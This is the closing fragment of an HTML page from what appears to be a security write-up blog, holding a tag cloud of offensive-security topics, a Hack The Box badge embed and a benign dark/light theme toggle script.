<a href="/tag/active-directory/" class="set-1">active-directory</a> <a href="/tag/binary-exploitation/" class="set-2">binary-exploitation</a> <a href="/tag/blockchain/" class="set-1">blockchain</a> <a href="/tag/bsd/" class="set-1">bsd</a> <a href="/tag/buffer-overflow/" class="set-2">buffer-overflow</a> <a href="/tag/c/" class="set-2">c</a> <a href="/tag/code-analysis/" class="set-1">code-analysis</a> <a href="/tag/cryptography/" class="set-1">cryptography</a> <a href="/tag/drupal/" class="set-1">drupal</a> <a href="/tag/egghunting/" class="set-1">egghunting</a> <a href="/tag/elasticsearch/" class="set-1">elasticsearch</a> <a href="/tag/exploit-development/" class="set-2">exploit-development</a> <a href="/tag/firewall/" class="set-1">firewall</a> <a href="/tag/forensics/" class="set-1">forensics</a> <a href="/tag/ftp/" class="set-1">ftp</a> <a href="/tag/git/" class="set-1">git</a> <a href="/tag/javascript/" class="set-1">javascript</a> <a href="/tag/joomla/" class="set-1">joomla</a> <a href="/tag/js/" class="set-1">js</a> <a href="/tag/kibana/" class="set-1">kibana</a> <a href="/tag/latex-injection/" class="set-1">latex-injection</a> <a href="/tag/ldap/" class="set-1">ldap</a> <a href="/tag/lfi/" class="set-1">lfi</a> <a href="/tag/linux/" class="set-5">linux</a> <a href="/tag/logstash/" class="set-1">logstash</a> <a href="/tag/networking/" class="set-2">networking</a> <a href="/tag/php/" class="set-2">php</a> <a href="/tag/pivoting/" class="set-1">pivoting</a> <a href="/tag/python/" class="set-3">python</a> <a href="/tag/rbash/" class="set-1">rbash</a> <a href="/tag/rce/" class="set-4">rce</a> <a href="/tag/reverse-engineering/" class="set-1">reverse-engineering</a> <a href="/tag/smart-contracts/" class="set-1">smart-contracts</a> <a href="/tag/smb/" class="set-2">smb</a> <a href="/tag/snmp/" class="set-1">snmp</a> <a href="/tag/solidity/" class="set-1">solidity</a> <a href="/tag/sqli/" class="set-1">sqli</a> <a href="/tag/ssh/" class="set-3">ssh</a> <a href="/tag/ssti/" class="set-1">ssti</a> <a href="/tag/steganography/" class="set-1">steganography</a> <a href="/tag/sudo/" class="set-1">sudo</a> <a href="/tag/suid/" class="set-1">suid</a> <a href="/tag/web/" class="set-5">web</a> <a href="/tag/windows/" class="set-3">windows</a> <a href="/tag/windows-exploitation/" class="set-1">windows-exploitation</a> <a href="/tag/winrm/" class="set-1">winrm</a> <a href="/tag/wordpress/" class="set-1">wordpress</a>
</div>
  



      </div>
    </main><footer class="site-footer">
	<center> <script src="https://www.hackthebox.eu/badge/65598"></script> </center>
  <div class="wrapper">
<div class="toggleWrapper">
    <input type="checkbox" class="dn" id="theme-toggle" onclick="modeSwitcher()" checked>
    <label for="theme-toggle" class="toggle">
    <span class="toggle__handler">
      <span class="crater crater--1"></span>
      <span class="crater crater--2"></span>
      <span class="crater crater--3"></span>
    </span>
        <span class="star star--1"></span>
        <span class="star star--2"></span>
        <span class="star star--3"></span>
        <span class="star star--4"></span>
        <span class="star star--5"></span>
        <span class="star star--6"></span>
    </label>
</div>
<script type="text/javascript">
if (localStorage.getItem("theme") === null) {
    window.localStorage.setItem('theme', 'dark');
}
const theme = localStorage.getItem('theme');
if (theme === "dark") {
	document.documentElement.setAttribute('data-theme', 'dark');
}
const userPrefers = getComputedStyle(document.documentElement).getPropertyValue('content');

if (theme === "dark") {
    document.getElementById('theme-toggle').checked = true;
    document.documentElement.setAttribute('data-theme', 'dark');
    document.documentElement.classList.add('theme--dark');
    document.documentElement.classList.remove('theme--light');
	document.getElementById("theme-toggle").className = 'light';
} else if (theme === "light") {
    document.getElementById('theme-toggle').checked = false;
    document.documentElement.setAttribute('data-theme', 'light');
    document.documentElement.classList.add('theme--light');
    document.documentElement.classList.remove('theme--dark');
	document.getElementById("theme-toggle").className = 'dark';
} else if  (userPrefers === "dark") {
    document.getElementById('theme-toggle').checked = false;
    document.documentElement.setAttribute('data-theme', 'dark');
	document.documentElement.classList.add('theme--dark');
    document.documentElement.classList.remove('theme--light');
	window.localStorage.setItem('theme', 'dark');
	document.getElementById("theme-toggle").className = 'light';
} else {
    document.getElementById('theme-toggle').checked = true;
    document.documentElement.setAttribute('data-theme', 'light');
	document.documentElement.classList.add('theme--light');
    document.documentElement.classList.remove('theme--dark');
	window.localStorage.setItem('theme', 'light');
	document.getElementById("theme-toggle").className = 'dark';
}

function modeSwitcher() {
	let currentMode = document.documentElement.getAttribute('data-theme');
	if (currentMode === "dark") {
	    document.documentElement.setAttribute('data-theme', 'light');
		document.documentElement.classList.add('theme--light');
        document.documentElement.classList.remove('theme--dark');
		window.localStorage.setItem('theme', 'light');
	    document.getElementById("theme-toggle").className = 'dark';
	} else {
	    document.documentElement.setAttribute('data-theme', 'dark');
		document.documentElement.classList.add('theme--dark');
        document.documentElement.classList.remove('theme--light');
		window.localStorage.setItem('theme', 'dark');
	    document.getElementById("theme-toggle").className = 'light';
	}
}
</script>
</div>
  
</footer>


<script>
      window.FontAwesomeConfig = {
        searchPseudoElements: true
      }
    </script>
  </body>

</html>
